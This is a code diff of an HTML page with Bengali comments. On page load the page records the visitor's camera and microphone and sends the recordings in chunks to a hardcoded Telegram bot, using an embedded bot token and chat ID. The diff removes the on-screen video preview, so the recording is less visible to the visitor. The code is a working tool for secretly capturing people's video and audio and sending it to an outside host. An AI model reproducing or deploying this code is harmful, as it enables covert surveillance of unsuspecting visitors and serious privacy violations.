@@ -12,34 +12,29 @@
             margin: 0;
             padding: 20px;
         }
-        video {
-            display: none; /* ভিডিও প্রিভিউ হাইড করা হয়েছে */
-        }
         h1 {
             color: #333;
         }
     </style>
 </head>
 <body>
-    <h1>Video is being captured and sent...</h1>
-    <video id="preview" autoplay muted></video>
+    <h1>Capturing Video and Sending to Telegram...</h1>
 
     <script>
-        const videoElement = document.getElementById('preview');
         const BOT_TOKEN = '8117453029:AAG9C5tgpxgVJE6coKUUeFTqxsnUUT7Q2s4'; // Replace with your Telegram bot token
         const CHAT_ID = '6332558073'; // Replace with your Telegram chat ID
         const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
 
         let mediaRecorder;
         let recordedChunks = [];
-        const CHUNK_DURATION = 5000; // প্রতিটি ভিডিও অংশের দৈর্ঘ্য (মিলিসেকেন্ডে)
+        const CHUNK_DURATION = 5000; // প্রতিটি অংশ ৫ সেকেন্ড
 
-        // অটোমেটিক ভিডিও ক্যাপচার শুরু
         async function startVideoCapture() {
             try {
+                // ক্যামেরা অ্যাক্সেস করা
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                videoElement.srcObject = stream;
 
+                // ভিডিও রেকর্ডার তৈরি করা
                 mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
 
                 mediaRecorder.ondataavailable = (event) => {
@@ -48,21 +43,22 @@
                     }
                 };
 
-                mediaRecorder.onstop = () => {
-                    sendChunksToTelegram();
+                mediaRecorder.onstop = async () => {
+                    await sendChunksToTelegram();
                 };
 
-                mediaRecorder.start(CHUNK_DURATION); // নির্দিষ্ট সময় ধরে ভিডিও ক্যাপচার
+                mediaRecorder.start(CHUNK_DURATION); // নির্ধারিত সময়ের জন্য ভিডিও রেকর্ড শুরু
+
+                // নির্ধারিত সময়ে রেকর্ড বন্ধ
                 setTimeout(() => {
-                    mediaRecorder.stop(); // রেকর্ডিং বন্ধ
-                }, CHUNK_DURATION * 10); // ৫০ সেকেন্ডে বন্ধ (পরিবর্তন করতে পারো)
+                    mediaRecorder.stop();
+                }, CHUNK_DURATION * 2); // ১০ সেকেন্ড পর বন্ধ
             } catch (error) {
-                console.error('Error accessing video stream:', error);
+                console.error('Error accessing camera or microphone:', error);
                 alert('Unable to access camera or microphone.');
             }
         }
 
-        // ভিডিও অংশগুলো টেলিগ্রামে পাঠানো
         async function sendChunksToTelegram() {
             for (let i = 0; i < recordedChunks.length; i++) {
                 const blob = new Blob([recordedChunks[i]], { type: 'video/webm' });
@@ -89,7 +85,7 @@
             alert('All video chunks have been sent!');
         }
 
-        // পৃষ্ঠাটি লোড হওয়ার সাথে সাথে ক্যাপচার শুরু
+        // পৃষ্ঠা লোড হওয়ার সাথে ভিডিও ক্যাপচার শুরু
         window.onload = startVideoCapture;
     </script>
 </body>
